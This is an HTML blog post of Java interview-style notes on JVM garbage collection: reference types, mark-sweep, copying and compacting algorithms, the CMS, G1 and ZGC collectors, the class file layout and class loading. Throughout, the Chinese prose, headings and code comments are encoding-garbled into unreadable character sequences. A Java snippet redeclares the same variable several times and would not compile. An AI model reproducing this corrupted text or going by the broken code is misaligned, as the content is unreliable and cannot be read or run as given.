<h2 id="åƒåœ¾å›æ”¶"><a href="#åƒåœ¾å›æ”¶" class="headerlink" title="åƒåœ¾å›æ”¶"></a>åƒåœ¾å›æ”¶</h2><p>å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£;ç»è¿‡ä¸€æ¬¡minor gcå¹´é¾„åŠ 1,å¯¹è±¡å¹´é¾„åˆ°äº†15ä¹Ÿä¼šè¿›å»è€å¹´ä»£;</p>
<h3 id="åˆ¤æ–­å¯¹è±¡æ­»äº¡"><a href="#åˆ¤æ–­å¯¹è±¡æ­»äº¡" class="headerlink" title="åˆ¤æ–­å¯¹è±¡æ­»äº¡"></a>åˆ¤æ–­å¯¹è±¡æ­»äº¡</h3><p>å¼•ç”¨è®¡æ•°æ³•:å®ç°ç®€å•æ•ˆç‡é«˜;ä½†æ˜¯æ— æ³•è§£å†³ç›¸äº’å¾ªç¯å¼•ç”¨é—®é¢˜;</p>
<p>å¯è¾¾æ€§åˆ†æç®—æ³•: è¿™ä¸ªç®—æ³•çš„åŸºæœ¬æ€æƒ³å°±æ˜¯é€šè¿‡ä¸€ç³»åˆ—çš„ç§°ä¸º <strong>â€œGC Rootsâ€</strong> çš„å¯¹è±¡ä½œä¸ºèµ·ç‚¹ï¼Œä»è¿™äº›èŠ‚ç‚¹å¼€å§‹å‘ä¸‹æœç´¢ï¼ŒèŠ‚ç‚¹æ‰€èµ°è¿‡çš„è·¯å¾„ç§°ä¸ºå¼•ç”¨é“¾ï¼Œå½“ä¸€ä¸ªå¯¹è±¡åˆ° GC Roots æ²¡æœ‰ä»»ä½•å¼•ç”¨é“¾ç›¸è¿çš„è¯ï¼Œåˆ™è¯æ˜æ­¤å¯¹è±¡æ˜¯ä¸å¯ç”¨çš„;å¯ä»¥è§£å†³å¾ªç¯å¼•ç”¨é—®é¢˜;åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œå…¶ä»–çº¿ç¨‹å¯èƒ½ä¼šæ›´æ–°å·²ç»è®¿é—®è¿‡çš„å¯¹è±¡ä¸­çš„å¼•ç”¨ï¼Œä»è€Œé€ æˆè¯¯æŠ¥ï¼ˆå°†å¼•ç”¨è®¾ç½®ä¸ºnullï¼‰æˆ–è€…æ¼æŠ¥ï¼ˆå°†å¼•ç”¨è®¾ç½®ä¸ºæœªè¢«è®¿é—®è¿‡çš„å¯¹è±¡ï¼‰ã€‚è¯¯æŠ¥å¹¶æ²¡æœ‰ä»€ä¹ˆä¼¤å®³ï¼ŒJavaè™šæ‹Ÿæœºè‡³å¤šæŸå¤±äº†éƒ¨åˆ†åƒåœ¾å›æ”¶çš„æœºä¼šã€‚æ¼æŠ¥åˆ™æ¯”è¾ƒéº»çƒ¦ï¼Œå› ä¸ºåƒåœ¾å›æ”¶å™¨å¯èƒ½å›æ”¶äº‹å®ä¸Šä»è¢«å¼•ç”¨çš„å¯¹è±¡å†…å­˜ã€‚ ä¸€æ—¦ä»åŸå¼•ç”¨è®¿é—®å·²ç»è¢«å›æ”¶äº†çš„å¯¹è±¡ï¼Œåˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥å¯¼è‡´Javaè™šæ‹Ÿæœºå´©æºƒã€‚</p>
<p>å³ä½¿åœ¨å¯è¾¾æ€§åˆ†ææ³•ä¸­ä¸å¯è¾¾çš„å¯¹è±¡ï¼Œä¹Ÿå¹¶éæ˜¯â€œéæ­»ä¸å¯â€çš„ï¼Œè¿™æ—¶å€™å®ƒä»¬æš‚æ—¶å¤„äºâ€œç¼“åˆ‘é˜¶æ®µâ€ï¼Œè¦çœŸæ­£å®£å‘Šä¸€ä¸ªå¯¹è±¡æ­»äº¡ï¼Œè‡³å°‘è¦ç»å†ä¸¤æ¬¡æ ‡è®°è¿‡ç¨‹ï¼›å¯è¾¾æ€§åˆ†ææ³•ä¸­ä¸å¯è¾¾çš„å¯¹è±¡è¢«ç¬¬ä¸€æ¬¡æ ‡è®°å¹¶ä¸”è¿›è¡Œä¸€æ¬¡ç­›é€‰ï¼Œç­›é€‰çš„æ¡ä»¶æ˜¯æ­¤å¯¹è±¡æ˜¯å¦æœ‰å¿…è¦æ‰§è¡Œ finalize æ–¹æ³•ã€‚å½“å¯¹è±¡æ²¡æœ‰è¦†ç›– finalize æ–¹æ³•ï¼Œæˆ– finalize æ–¹æ³•å·²ç»è¢«è™šæ‹Ÿæœºè°ƒç”¨è¿‡æ—¶ï¼Œè™šæ‹Ÿæœºå°†è¿™ä¸¤ç§æƒ…å†µè§†ä¸ºæ²¡æœ‰å¿…è¦æ‰§è¡Œã€‚</p>
<p>è¢«åˆ¤å®šä¸ºéœ€è¦æ‰§è¡Œçš„å¯¹è±¡å°†ä¼šè¢«æ”¾åœ¨ä¸€ä¸ªé˜Ÿåˆ—ä¸­è¿›è¡Œç¬¬äºŒæ¬¡æ ‡è®°ï¼Œé™¤éè¿™ä¸ªå¯¹è±¡ä¸å¼•ç”¨é“¾ä¸Šçš„ä»»ä½•ä¸€ä¸ªå¯¹è±¡å»ºç«‹å…³è”ï¼Œå¦åˆ™å°±ä¼šè¢«çœŸçš„å›æ”¶ã€‚</p>
<h4 id="ä»‹ç»ä¸€ä¸‹å¼ºå¼•ç”¨ã€è½¯å¼•ç”¨ã€å¼±å¼•ç”¨ã€è™šå¼•ç”¨çš„åŒºåˆ«ï¼Ÿ"><a href="#ä»‹ç»ä¸€ä¸‹å¼ºå¼•ç”¨ã€è½¯å¼•ç”¨ã€å¼±å¼•ç”¨ã€è™šå¼•ç”¨çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="ä»‹ç»ä¸€ä¸‹å¼ºå¼•ç”¨ã€è½¯å¼•ç”¨ã€å¼±å¼•ç”¨ã€è™šå¼•ç”¨çš„åŒºåˆ«ï¼Ÿ"></a>ä»‹ç»ä¸€ä¸‹å¼ºå¼•ç”¨ã€è½¯å¼•ç”¨ã€å¼±å¼•ç”¨ã€è™šå¼•ç”¨çš„åŒºåˆ«ï¼Ÿ</h4><p>å¼ºå¼•ç”¨: å¿…ä¸å¯å°‘çš„ç”Ÿæ´»ç”¨å“,å³ä½¿æŠ¥OOMä¹Ÿä¸å›æ”¶; </p>
<p>è½¯å¼•ç”¨: å¯æœ‰å¯æ— çš„ç”Ÿæ´»ç”¨å“,å†…å­˜å¤Ÿä¸å›æ”¶,å†…å­˜ä¸å¤Ÿå°±å›æ”¶; é€‚åˆåšç¼“å­˜;</p>
<p>å¼±å¼•ç”¨: å¯æœ‰å¯æ— çš„ç”Ÿæ´»ç”¨å“,ä½†æ˜¯åªè¦åƒåœ¾å›æ”¶å™¨å‘ç°å°±ä¼šå›æ”¶,ä¸ç®¡å†…å­˜å¤Ÿä¸å¤Ÿ;  Thread LocalMapçš„keyæ˜¯å¼±å¼•ç”¨;</p>
<p>è™šå¼•ç”¨: å½¢åŒè™šè®¾, ä»»ä½•æ—¶å€™éƒ½ä¼šè¢«å›æ”¶; get()ä¹Ÿæ‹¿ä¸åˆ°; ç®¡ç†ç›´æ¥å†…å­˜(mmap);åœ¨å›æ”¶çš„æ—¶å€™èµ·ä¸€ä¸ªé€šçŸ¥çš„ä½œç”¨,è¢«å›æ”¶çš„æ—¶å€™æ”¾åˆ°é˜Ÿåˆ—é‡Œå», ç„¶åJVMå†å»å¤„ç†è¿™ä¸ªé˜Ÿåˆ—,å¯ä»¥é€šçŸ¥OSå»å¤„ç†å †å¤–å†…å­˜;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¼ºå¼•ç”¨</span></span><br><span class="line"><span class="type">String</span> <span class="variable">strongReference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="comment">// è½¯å¼•ç”¨</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">SoftReference&lt;String&gt; softReference = <span class="keyword">new</span> <span class="title class_">SoftReference</span>&lt;String&gt;(str);</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">WeakReference&lt;String&gt; weakReference = <span class="keyword">new</span> <span class="title class_">WeakReference</span>&lt;&gt;(str);</span><br><span class="line"><span class="comment">// å¼±å¼•ç”¨è½¬å¼ºå¼•ç”¨</span></span><br><span class="line"><span class="type">String</span> <span class="variable">strongReference</span> <span class="operator">=</span> weakReference.get();</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="type">ReferenceQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceQueue</span>();</span><br><span class="line"><span class="comment">// åˆ›å»ºè™šå¼•ç”¨ï¼Œè¦æ±‚å¿…é¡»ä¸ä¸€ä¸ªå¼•ç”¨é˜Ÿåˆ—å…³è”</span></span><br><span class="line"><span class="type">PhantomReference</span> <span class="variable">pr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PhantomReference</span>(str, queue);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://juejin.cn/post/6844903665241686029">https://juejin.cn/post/6844903665241686029</a></p>
<h3 id="åˆ¤æ–­å¸¸é‡æ˜¯å¦æ˜¯åºŸå¼ƒå¸¸é‡"><a href="#åˆ¤æ–­å¸¸é‡æ˜¯å¦æ˜¯åºŸå¼ƒå¸¸é‡" class="headerlink" title="åˆ¤æ–­å¸¸é‡æ˜¯å¦æ˜¯åºŸå¼ƒå¸¸é‡"></a>åˆ¤æ–­å¸¸é‡æ˜¯å¦æ˜¯åºŸå¼ƒå¸¸é‡</h3><p>å‡å¦‚åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­å­˜åœ¨å­—ç¬¦ä¸² â€œabcâ€ï¼Œå¦‚æœå½“å‰æ²¡æœ‰ä»»ä½• String å¯¹è±¡å¼•ç”¨è¯¥å­—ç¬¦ä¸²å¸¸é‡çš„è¯ï¼Œå°±è¯´æ˜å¸¸é‡ â€œabcâ€ å°±æ˜¯åºŸå¼ƒå¸¸é‡ï¼Œå¦‚æœè¿™æ—¶å‘ç”Ÿå†…å­˜å›æ”¶çš„è¯è€Œä¸”æœ‰å¿…è¦çš„è¯ï¼Œâ€abcâ€ å°±ä¼šè¢«ç³»ç»Ÿæ¸…ç†å‡ºå¸¸é‡æ± äº†ã€‚</p>
<h3 id="åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯æ— ç”¨çš„ç±»"><a href="#åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯æ— ç”¨çš„ç±»" class="headerlink" title="åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯æ— ç”¨çš„ç±»"></a>åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯æ— ç”¨çš„ç±»</h3><p>æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶æ‰å¯ä»¥è¢«å›æ”¶; javaå †ä¸å­˜åœ¨ä»»ä½•è¯¥ç±»çš„å®ä¾‹; è¯¥ç±»çš„classloaderå·²ç»è¢«å›æ”¶;è¯¥ç±»çš„java.lang.Classå¯¹è±¡æ²¡æœ‰åœ¨ä»»ä½•åœ°æ–¹è¢«å¼•ç”¨,æ— æ³•åœ¨ä»»ä½•åœ°æ–¹é€šè¿‡åå°„è®¿é—®è¯¥ç±»çš„æ–¹æ³•;</p>
<h2 id="åƒåœ¾å›æ”¶ç®—æ³•"><a href="#åƒåœ¾å›æ”¶ç®—æ³•" class="headerlink" title="åƒåœ¾å›æ”¶ç®—æ³•"></a>åƒåœ¾å›æ”¶ç®—æ³•</h2><p>æ ‡è®°æ¸…é™¤ç®—æ³•: æ ‡è®°éœ€è¦ä¸æ¸…é™¤çš„å¯¹è±¡,ç„¶åæ¸…é™¤æ²¡æœ‰è¢«æ ‡è®°çš„å¯¹è±¡, ä¹Ÿå¯ä»¥æ ‡è®°ä¸éœ€è¦æ¸…é™¤çš„å¯¹è±¡, ç„¶åæ¸…é™¤æœªè¢«æ ‡è®°çš„å¯¹è±¡; ç¼ºç‚¹:  å†…å­˜ç¢ç‰‡å¾ˆå¤š, æ‰§è¡Œæ•ˆç‡ä¸ç¨³å®š, å¦‚æœæœ‰å¤§é‡å¯¹è±¡éœ€è¦æ¸…é™¤, è¿™æ—¶å°±éœ€è¦è¿›è¡Œå¤§é‡çš„æ ‡è®°å’Œæ¸…é™¤åŠ¨ä½œ,å¯¼è‡´æ ‡è®°å’Œæ¸…é™¤è¿™ä¸¤ä¸ªè¿‡ç¨‹çš„æ‰§è¡Œæ•ˆç‡éšå¯¹è±¡æ•°é‡å¢åŠ è€Œé™ä½;</p>
<p>æ ‡è®°å¤åˆ¶ç®—æ³•: å†…å­˜åˆ†ä¸ºä¸¤å—,å°†å­˜æ´»çš„å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—ç©ºé—´,ç„¶åå°†åŸæ¥è¿™å—ç©ºé—´å…¨éƒ¨æ¸…é™¤; ç¼ºç‚¹: ä¼šæµªè´¹ç©ºé—´</p>
<p>æ ‡è®°æ•´ç†ç®—æ³•: è€å¹´ä»£ä½¿ç”¨;å°†å¯¹è±¡å¾€ä¸€ç«¯ç§»åŠ¨,ç›´æ¥æ¸…ç†æ‰ç«¯è¾¹ç•Œä»¥å¤–çš„å†…å­˜; æ•´ç†çš„è¿‡ç¨‹æ¯”è¾ƒè€—æ—¶;</p>
<p>åˆ†ä»£æ”¶é›†ç®—æ³•: åœ¨æ–°ç”Ÿä»£ä¸­ï¼Œæ¯æ¬¡æ”¶é›†éƒ½ä¼šæœ‰å¤§é‡å¯¹è±¡æ­»å»ï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©â€æ ‡è®°-å¤åˆ¶â€œç®—æ³•ï¼Œåªéœ€è¦ä»˜å‡ºå°‘é‡å¯¹è±¡çš„å¤åˆ¶æˆæœ¬å°±å¯ä»¥å®Œæˆæ¯æ¬¡åƒåœ¾æ”¶é›†ã€‚è€Œè€å¹´ä»£çš„å¯¹è±¡å­˜æ´»å‡ ç‡æ˜¯æ¯”è¾ƒé«˜çš„ï¼Œè€Œä¸”æ²¡æœ‰é¢å¤–çš„ç©ºé—´å¯¹å®ƒè¿›è¡Œåˆ†é…æ‹…ä¿ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»é€‰æ‹©â€œæ ‡è®°-æ¸…é™¤â€æˆ–â€œæ ‡è®°-æ•´ç†â€ç®—æ³•è¿›è¡Œåƒåœ¾æ”¶é›†;</p>
<h2 id="åƒåœ¾æ”¶é›†å™¨"><a href="#åƒåœ¾æ”¶é›†å™¨" class="headerlink" title="åƒåœ¾æ”¶é›†å™¨"></a>åƒåœ¾æ”¶é›†å™¨</h2><p>Serial : å•çº¿ç¨‹,éœ€è¦æš‚åœå…¶ä»–å·¥ä½œçº¿ç¨‹,æ²¡æœ‰çº¿ç¨‹åˆ‡æ¢çš„å¼€é”€,æ•ˆç‡é«˜,æ–°æ ‡è®°å¤åˆ¶,è€æ ‡è®°æ•´ç†;é€‚ç”¨è¿è¡Œåœ¨ Client æ¨¡å¼ä¸‹çš„è™šæ‹Ÿæœº; </p>
<p>ParNew: serialçš„å¤šçº¿ç¨‹ç‰ˆæœ¬,æ–°æ ‡è®°å¤åˆ¶,è€æ ‡è®°æ•´ç†;serveræ¨¡å¼ä¸‹é€‚ç”¨; </p>
<p>Parallel Scavenge: å…³æ³¨cpuååé‡,æ–°æ ‡è®°å¤åˆ¶,è€æ ‡è®°æ•´ç†,jdk 8é»˜è®¤;</p>
<p>serial old: Serialçš„è€å¹´ä»£ç‰ˆæœ¬;</p>
<p>Parallel Old: Parallel Scavengeçš„è€å¹´ä»£ç‰ˆæœ¬</p>
<h3 id="CMS-concurrent-mark-sweep"><a href="#CMS-concurrent-mark-sweep" class="headerlink" title="CMS(concurrent mark sweep)"></a>CMS(concurrent mark sweep)</h3><p>æ³¨é‡ç”¨æˆ·ä½“éªŒ,ä¸ºäº†è·å–æœ€çŸ­åœé¡¿æ—¶é—´;æ˜¯hotspotè™šæ‹Ÿæœºç¬¬ä¸€æ¬¾å¹¶å‘æ”¶é›†å™¨,ç¬¬ä¸€æ¬¡å®ç°è®©åƒåœ¾æ”¶é›†çº¿ç¨‹å’Œç”¨æˆ·çº¿ç¨‹åŸºæœ¬ä¸ŠåŒæ—¶å·¥ä½œ; è€æ ‡è®°æ¸…é™¤,åªæ”¶é›†è€å¹´ä»£åƒåœ¾;</p>
<ul>
<li>åˆå§‹æ ‡è®°ï¼š æš‚åœæ‰€æœ‰çš„å…¶ä»–çº¿ç¨‹ï¼Œå¹¶è®°å½•ä¸‹ç›´æ¥ä¸ root ç›¸è¿çš„å¯¹è±¡ï¼Œé€Ÿåº¦å¾ˆå¿« ï¼›</li>
<li>å¹¶å‘æ ‡è®°ï¼š åŒæ—¶å¼€å¯ GC å’Œç”¨æˆ·çº¿ç¨‹ï¼Œç”¨ä¸€ä¸ªé—­åŒ…ç»“æ„å»è®°å½•å¯è¾¾å¯¹è±¡ã€‚ä½†åœ¨è¿™ä¸ªé˜¶æ®µç»“æŸï¼Œè¿™ä¸ªé—­åŒ…ç»“æ„å¹¶ä¸èƒ½ä¿è¯åŒ…å«å½“å‰æ‰€æœ‰çš„å¯è¾¾å¯¹è±¡ã€‚å› ä¸ºç”¨æˆ·çº¿ç¨‹å¯èƒ½ä¼šä¸æ–­çš„æ›´æ–°å¼•ç”¨åŸŸï¼Œæ‰€ä»¥ GC çº¿ç¨‹æ— æ³•ä¿è¯å¯è¾¾æ€§åˆ†æçš„å®æ—¶æ€§ã€‚æ‰€ä»¥è¿™ä¸ªç®—æ³•é‡Œä¼šè·Ÿè¸ªè®°å½•è¿™äº›å‘ç”Ÿå¼•ç”¨æ›´æ–°çš„åœ°æ–¹ã€‚</li>
<li>é‡æ–°æ ‡è®°ï¼š é‡æ–°æ ‡è®°é˜¶æ®µå°±æ˜¯ä¸ºäº†ä¿®æ­£å¹¶å‘æ ‡è®°æœŸé—´å› ä¸ºç”¨æˆ·ç¨‹åºç»§ç»­è¿è¡Œè€Œå¯¼è‡´æ ‡è®°äº§ç”Ÿå˜åŠ¨çš„é‚£ä¸€éƒ¨åˆ†å¯¹è±¡çš„æ ‡è®°è®°å½•ï¼Œè¿™ä¸ªé˜¶æ®µçš„åœé¡¿æ—¶é—´ä¸€èˆ¬ä¼šæ¯”åˆå§‹æ ‡è®°é˜¶æ®µçš„æ—¶é—´ç¨é•¿ï¼Œè¿œè¿œæ¯”å¹¶å‘æ ‡è®°é˜¶æ®µæ—¶é—´çŸ­</li>
<li>å¹¶å‘æ¸…é™¤ï¼š å¼€å¯ç”¨æˆ·çº¿ç¨‹ï¼ŒåŒæ—¶ GC çº¿ç¨‹å¼€å§‹å¯¹æœªæ ‡è®°çš„åŒºåŸŸåšæ¸…æ‰«ã€‚</li>
</ul>
<p>ä»å®ƒçš„åå­—å°±å¯ä»¥çœ‹å‡ºå®ƒæ˜¯ä¸€æ¬¾ä¼˜ç§€çš„åƒåœ¾æ”¶é›†å™¨ï¼Œä¸»è¦ä¼˜ç‚¹ï¼šå¹¶å‘æ”¶é›†ã€ä½åœé¡¿ã€‚ä½†æ˜¯å®ƒæœ‰ä¸‹é¢ä¸‰ä¸ªæ˜æ˜¾çš„ç¼ºç‚¹ï¼š</p>
<ul>
<li>å¯¹ CPU èµ„æºæ•æ„Ÿï¼›</li>
<li>æ— æ³•å¤„ç†æµ®åŠ¨åƒåœ¾ï¼›</li>
<li>å®ƒä½¿ç”¨çš„å›æ”¶ç®—æ³•-â€œæ ‡è®°-æ¸…é™¤â€ç®—æ³•ä¼šå¯¼è‡´æ”¶é›†ç»“æŸæ—¶ä¼šæœ‰å¤§é‡ç©ºé—´ç¢ç‰‡äº§ç”Ÿã€‚</li>
</ul>
<h3 id="G1æ”¶é›†å™¨"><a href="#G1æ”¶é›†å™¨" class="headerlink" title="G1æ”¶é›†å™¨"></a>G1æ”¶é›†å™¨</h3><p>G1 (Garbage-First) æ˜¯ä¸€æ¬¾é¢å‘æœåŠ¡å™¨çš„åƒåœ¾æ”¶é›†å™¨,ä¸»è¦é’ˆå¯¹é…å¤‡å¤šé¢—å¤„ç†å™¨åŠå¤§å®¹é‡å†…å­˜çš„æœºå™¨. ä»¥æé«˜æ¦‚ç‡æ»¡è¶³ GC åœé¡¿æ—¶é—´è¦æ±‚çš„åŒæ—¶,è¿˜å…·å¤‡é«˜ååé‡æ€§èƒ½ç‰¹å¾. èƒ½ç‹¬ç«‹ç®¡ç†æ•´ä¸ª GC å †;</p>
<p>è¢«è§†ä¸º JDK1.7 ä¸­ HotSpot è™šæ‹Ÿæœºçš„ä¸€ä¸ªé‡è¦è¿›åŒ–ç‰¹å¾ã€‚å®ƒå…·å¤‡ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ul>
<li>å¹¶è¡Œä¸å¹¶å‘ï¼šG1 èƒ½å……åˆ†åˆ©ç”¨ CPUã€å¤šæ ¸ç¯å¢ƒä¸‹çš„ç¡¬ä»¶ä¼˜åŠ¿ï¼Œä½¿ç”¨å¤šä¸ª CPUï¼ˆCPU æˆ–è€… CPU æ ¸å¿ƒï¼‰æ¥ç¼©çŸ­ Stop-The-World åœé¡¿æ—¶é—´ã€‚éƒ¨åˆ†å…¶ä»–æ”¶é›†å™¨åŸæœ¬éœ€è¦åœé¡¿ Java çº¿ç¨‹æ‰§è¡Œçš„ GC åŠ¨ä½œï¼ŒG1 æ”¶é›†å™¨ä»ç„¶å¯ä»¥é€šè¿‡å¹¶å‘çš„æ–¹å¼è®© java ç¨‹åºç»§ç»­æ‰§è¡Œã€‚</li>
<li>åˆ†ä»£æ”¶é›†ï¼šè™½ç„¶ G1 å¯ä»¥ä¸éœ€è¦å…¶ä»–æ”¶é›†å™¨é…åˆå°±èƒ½ç‹¬ç«‹ç®¡ç†æ•´ä¸ª GC å †ï¼Œä½†æ˜¯è¿˜æ˜¯ä¿ç•™äº†åˆ†ä»£çš„æ¦‚å¿µã€‚</li>
<li>ç©ºé—´æ•´åˆï¼šä¸ CMS çš„â€œæ ‡è®°-æ¸…ç†â€ç®—æ³•ä¸åŒï¼ŒG1 ä»æ•´ä½“æ¥çœ‹æ˜¯åŸºäºâ€œæ ‡è®°-æ•´ç†â€ç®—æ³•å®ç°çš„æ”¶é›†å™¨ï¼›ä»å±€éƒ¨ä¸Šæ¥çœ‹æ˜¯åŸºäºâ€œæ ‡è®°-å¤åˆ¶â€ç®—æ³•å®ç°çš„ã€‚</li>
<li>å¯é¢„æµ‹çš„åœé¡¿ï¼šè¿™æ˜¯ G1 ç›¸å¯¹äº CMS çš„å¦ä¸€ä¸ªå¤§ä¼˜åŠ¿ï¼Œé™ä½åœé¡¿æ—¶é—´æ˜¯ G1 å’Œ CMS å…±åŒçš„å…³æ³¨ç‚¹ï¼Œä½† G1 é™¤äº†è¿½æ±‚ä½åœé¡¿å¤–ï¼Œè¿˜èƒ½å»ºç«‹å¯é¢„æµ‹çš„åœé¡¿æ—¶é—´æ¨¡å‹ï¼Œèƒ½è®©ä½¿ç”¨è€…æ˜ç¡®æŒ‡å®šåœ¨ä¸€ä¸ªé•¿åº¦ä¸º M æ¯«ç§’çš„æ—¶é—´ç‰‡æ®µå†…ã€‚</li>
</ul>
<p>G1 æ”¶é›†å™¨çš„è¿ä½œå¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p>
<ul>
<li>åˆå§‹æ ‡è®°</li>
<li>å¹¶å‘æ ‡è®°</li>
<li>æœ€ç»ˆæ ‡è®°</li>
<li>ç­›é€‰å›æ”¶</li>
</ul>
<p>G1 æ”¶é›†å™¨åœ¨åå°ç»´æŠ¤äº†ä¸€ä¸ªä¼˜å…ˆåˆ—è¡¨ï¼Œæ¯æ¬¡æ ¹æ®å…è®¸çš„æ”¶é›†æ—¶é—´ï¼Œä¼˜å…ˆé€‰æ‹©å›æ”¶ä»·å€¼æœ€å¤§çš„ Region(è¿™ä¹Ÿå°±æ˜¯å®ƒçš„åå­— Garbage-First çš„ç”±æ¥) ã€‚è¿™ç§ä½¿ç”¨ Region åˆ’åˆ†å†…å­˜ç©ºé—´ä»¥åŠæœ‰ä¼˜å…ˆçº§çš„åŒºåŸŸå›æ”¶æ–¹å¼ï¼Œä¿è¯äº† G1 æ”¶é›†å™¨åœ¨æœ‰é™æ—¶é—´å†…å¯ä»¥å°½å¯èƒ½é«˜çš„æ”¶é›†æ•ˆç‡ï¼ˆæŠŠå†…å­˜åŒ–æ•´ä¸ºé›¶ï¼‰ã€‚</p>
<h3 id="ZGC-æ”¶é›†å™¨"><a href="#ZGC-æ”¶é›†å™¨" class="headerlink" title="ZGC æ”¶é›†å™¨"></a>ZGC æ”¶é›†å™¨</h3><p>ä¸ CMS ä¸­çš„ ParNew å’Œ G1 ç±»ä¼¼ï¼ŒZGC ä¹Ÿé‡‡ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•ï¼Œä¸è¿‡ ZGC å¯¹è¯¥ç®—æ³•åšäº†é‡å¤§æ”¹è¿›ã€‚</p>
<p>åœ¨ ZGC ä¸­å‡ºç° Stop The World çš„æƒ…å†µä¼šæ›´å°‘ï¼</p>
<h2 id="classç±»æ–‡ä»¶ç»“æ„"><a href="#classç±»æ–‡ä»¶ç»“æ„" class="headerlink" title="classç±»æ–‡ä»¶ç»“æ„"></a>classç±»æ–‡ä»¶ç»“æ„</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4             magic; <span class="comment">//Class æ–‡ä»¶çš„æ ‡å¿—</span></span><br><span class="line">    u2             minor_version;<span class="comment">//Class çš„å°ç‰ˆæœ¬å·</span></span><br><span class="line">    u2             major_version;<span class="comment">//Class çš„å¤§ç‰ˆæœ¬å·</span></span><br><span class="line">    u2             constant_pool_count;<span class="comment">//å¸¸é‡æ± çš„æ•°é‡</span></span><br><span class="line">    cp_info        constant_pool[constant_pool_count-<span class="number">1</span>];<span class="comment">//å¸¸é‡æ± </span></span><br><span class="line">    u2             access_flags;<span class="comment">//Class çš„è®¿é—®æ ‡è®°</span></span><br><span class="line">    u2             this_class;<span class="comment">//å½“å‰ç±»</span></span><br><span class="line">    u2             super_class;<span class="comment">//çˆ¶ç±»</span></span><br><span class="line">    u2             interfaces_count;<span class="comment">//æ¥å£</span></span><br><span class="line">    u2             interfaces[interfaces_count];<span class="comment">//ä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£</span></span><br><span class="line">    u2             fields_count;<span class="comment">//Class æ–‡ä»¶çš„å­—æ®µå±æ€§</span></span><br><span class="line">    field_info     fields[fields_count];<span class="comment">//ä¸€ä¸ªç±»ä¼šå¯ä»¥æœ‰å¤šä¸ªå­—æ®µ</span></span><br><span class="line">    u2             methods_count;<span class="comment">//Class æ–‡ä»¶çš„æ–¹æ³•æ•°é‡</span></span><br><span class="line">    method_info    methods[methods_count];<span class="comment">//ä¸€ä¸ªç±»å¯ä»¥æœ‰ä¸ªå¤šä¸ªæ–¹æ³•</span></span><br><span class="line">    u2             attributes_count;<span class="comment">//æ­¤ç±»çš„å±æ€§è¡¨ä¸­çš„å±æ€§æ•°</span></span><br><span class="line">    attribute_info attributes[attributes_count];<span class="comment">//å±æ€§è¡¨é›†åˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ç±»åŠ è½½è¿‡ç¨‹"><a href="#ç±»åŠ è½½è¿‡ç¨‹" class="headerlink" title="ç±»åŠ è½½è¿‡ç¨‹"></a>ç±»åŠ è½½è¿‡ç¨‹</h2><p>ä¸€ä¸ªç±»çš„å®Œæ•´ç”Ÿå‘½å‘¨æœŸä¸­:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848914.png" alt="img"></p>
<h3 id="åŠ è½½"><a href="#åŠ è½½" class="headerlink" title="åŠ è½½"></a>åŠ è½½</h3><p> é€šè¿‡å…¨ç±»åè·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµ; å°†å­—èŠ‚æµè½¬æ¢ä¸ºæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„; åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¯¥ç±»çš„Classå¯¹è±¡,ä½œä¸ºæ–¹æ³•åŒºè¿™äº›æ•°æ®çš„è®¿é—®å…¥å£;</p>
